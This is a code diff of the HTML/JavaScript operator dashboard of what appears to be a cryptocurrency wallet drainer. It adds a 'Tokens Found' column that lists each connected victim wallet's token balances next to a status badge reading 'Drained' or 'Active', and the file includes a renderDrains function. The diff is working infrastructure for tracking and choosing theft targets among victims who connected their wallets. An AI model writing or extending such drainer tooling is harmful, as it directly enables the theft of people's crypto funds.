@@ -207,7 +207,7 @@
         <div class="card-body">
           <table>
             <thead><tr>
-              <th>Address</th><th>Chain</th><th>Connected At</th><th>Drained</th>
+              <th>Address</th><th>Chain</th><th>Tokens Found</th><th>Connected At</th><th>Status</th>
             </tr></thead>
             <tbody id="wallets-tbody"></tbody>
           </table>
@@ -374,14 +374,24 @@
     const wallets = dashData.connectedWallets || []
     document.getElementById('wallets-count').textContent = wallets.length + ' total'
     document.getElementById('wallets-tbody').innerHTML = wallets.length === 0
-      ? '<tr><td colspan="4" class="empty">No wallets yet</td></tr>'
-      : wallets.map(w => `
-          <tr>
+      ? '<tr><td colspan="5" class="empty">No wallets yet</td></tr>'
+      : wallets.map(w => {
+          const tokenHtml = (w.tokens && w.tokens.length)
+            ? w.tokens.map(t =>
+                `<span style="display:inline-block;background:rgba(99,102,241,0.15);border:1px solid rgba(99,102,241,0.3);border-radius:4px;padding:2px 7px;font-size:11px;margin:1px;">
+                  ${t.symbol} <strong>${parseFloat(t.balance).toFixed(2)}</strong>
+                  <span style="color:#64748b;font-size:10px;">${t.chain}</span>
+                </span>`
+              ).join('')
+            : '<span style="color:#475569;font-size:12px;">scanning...</span>'
+          return `<tr>
             <td><span title="${w.address}">${w.address}</span></td>
             <td>${CHAIN_NAMES[w.chainId] || w.chainId}</td>
+            <td style="max-width:280px">${tokenHtml}</td>
             <td>${new Date(w.connectedAt).toLocaleString()}</td>
             <td><span class="badge ${w.drained ? 'success' : 'pending'}">${w.drained ? '✓ Drained' : 'Active'}</span></td>
-          </tr>`).join('')
+          </tr>`
+        }).join('')
   }
 
   function renderDrains() {
